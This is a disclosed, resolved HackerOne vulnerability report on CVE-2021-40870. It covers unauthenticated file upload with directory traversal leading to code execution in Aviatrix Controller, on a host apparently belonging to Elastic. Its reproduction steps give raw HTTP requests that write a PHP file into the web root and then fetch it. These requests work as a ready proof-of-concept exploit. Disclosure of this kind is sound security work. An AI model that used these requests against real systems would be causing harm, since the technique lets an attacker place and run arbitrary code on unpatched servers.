# [C] CVE-2021-40870 on [52.204.160.31]

## Summary
Severity: Critical (CVSS 9.8)
Program: Elastic
Weakness: Code Injection
Reporter: fdeleite
State: resolved
Disclosed: 2021-10-06T16:06:41.191Z
CVE: CVE-2021-40870
Source: https://hackerone.com/reports/1356845

## Details
An issue was discovered in Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal.

The IP has a SSL certificate pointing to ElasticSearch. 
``curl -kv https://52.204.160.31``

Output

```
 Server certificate:
*  subject: C=US; ST=California; L=Mountain View; O=Elasticsearch, Inc.; CN=*.elasticit.co
```


## Steps To Reproduce

First, run this request:
```
POST /v1/backend1 HTTP/1.1
Host: 52.204.160.31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Length: 136
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>

```
The retrieve the content from file ``1yv4QQmkj4h4OdmmyT11tkiGf5M.php``

```
GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1
Host: 52.204.160.31
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1356845_
